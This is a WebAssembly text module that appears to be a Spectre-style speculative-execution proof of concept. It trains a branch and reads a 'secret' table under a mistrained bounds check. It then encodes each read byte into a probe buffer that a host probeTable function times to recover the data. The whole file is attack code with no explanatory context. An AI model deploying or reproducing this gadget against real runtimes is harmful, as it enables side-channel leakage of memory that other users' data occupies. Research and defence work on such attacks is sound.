(module
 (type $FUNCSIG$ii (func (param i32) (result i32)))
 (import "env" "malloc" (func $malloc (param i32) (result i32)))
 (import "env" "probeTable" (func $probeTable (param i32) (result i32)))
 (table 0 anyfunc)
 (memory $0 1)
 (data (i32.const 16) "\00")
 (data (i32.const 20) "\00\00\00\00")
 (data (i32.const 24) "\n\00\00\00")
 (data (i32.const 28) "\00\00\00\00")
 (export "memory" (memory $0))
 (export "getSecretTableAddress" (func $getSecretTableAddress))
 (export "initialize" (func $initialize))
 (export "speculativelyReadAddress" (func $speculativelyReadAddress))
 (func $getSecretTableAddress (; 2 ;) (result i32)
  (i32.load offset=20
   (i32.const 0)
  )
 )
 (func $initialize (; 3 ;)
  (local $0 i32)
  (i32.store offset=28
   (i32.const 0)
   (call $malloc
    (i32.const 524288)
   )
  )
  (i32.store8
   (tee_local $0
    (call $malloc
     (i32.const 4096)
    )
   )
   (i32.const 0)
  )
  (i32.store offset=20
   (i32.const 0)
   (get_local $0)
  )
  (set_local $0
   (i32.const 1)
  )
  (loop $label$0
   (i32.store8
    (i32.add
     (i32.load offset=20
      (i32.const 0)
     )
     (get_local $0)
    )
    (get_local $0)
   )
   (br_if $label$0
    (i32.ne
     (tee_local $0
      (i32.add
       (get_local $0)
       (i32.const 1)
      )
     )
     (i32.const 4096)
    )
   )
  )
 )
 (func $speculativelyReadAddress (; 4 ;) (param $0 i32) (param $1 i32) (param $2 i32) (param $3 i32)
  (local $4 i32)
  (local $5 i32)
  (local $6 i32)
  (local $7 i32)
  (local $8 i32)
  (local $9 i32)
  (local $10 i32)
  (set_local $4
   (call $malloc
    (i32.mul
     (get_local $1)
     (i32.const 10)
    )
   )
  )
  (set_local $5
   (call $malloc
    (i32.mul
     (i32.add
      (get_local $2)
      (i32.const 1)
     )
     (get_local $1)
    )
   )
  )
  (block $label$0
   (br_if $label$0
    (i32.eqz
     (get_local $3)
    )
   )
   (set_local $9
    (i32.const 0)
   )
   (loop $label$1
    (set_local $2
     (get_local $3)
    )
    (set_local $10
     (get_local $4)
    )
    (loop $label$2
     (i32.store8 offset=16
      (i32.const 0)
      (tee_local $7
       (i32.or
        (i32.or
         (tee_local $6
          (select
           (get_local $0)
           (i32.const 0)
           (tee_local $8
            (i32.eq
             (get_local $2)
             (i32.const 1)
            )
           )
          )
         )
         (get_local $8)
        )
        (tee_local $8
         (select
          (get_local $1)
          (i32.const 0)
          (get_local $8)
         )
        )
       )
      )
     )
     (block $label$3
      (block $label$4
       (br_if $label$4
        (i32.ne
         (get_local $2)
         (i32.const 1)
        )
       )
       (br_if $label$3
        (i32.eqz
         (i32.and
          (i32.load8_u
           (get_local $10)
          )
          (i32.const 255)
         )
        )
       )
      )
      (i32.store8 offset=16
       (i32.const 0)
       (i32.xor
        (get_local $7)
        (i32.load8_u
         (i32.add
          (get_local $5)
          (i32.mul
           (i32.add
            (i32.load8_u
             (i32.add
              (i32.load offset=20
               (i32.const 0)
              )
              (get_local $6)
             )
            )
            (i32.const 1)
           )
           (get_local $8)
          )
         )
        )
       )
      )
     )
     (set_local $10
      (i32.add
       (get_local $10)
       (get_local $1)
      )
     )
     (br_if $label$2
      (tee_local $2
       (i32.add
        (get_local $2)
        (i32.const -1)
       )
      )
     )
    )
    (br_if $label$1
     (i32.ne
      (tee_local $9
       (i32.add
        (get_local $9)
        (i32.const 1)
       )
      )
      (i32.const 10)
     )
    )
   )
  )
  (drop
   (call $probeTable
    (get_local $5)
   )
  )
 )
)
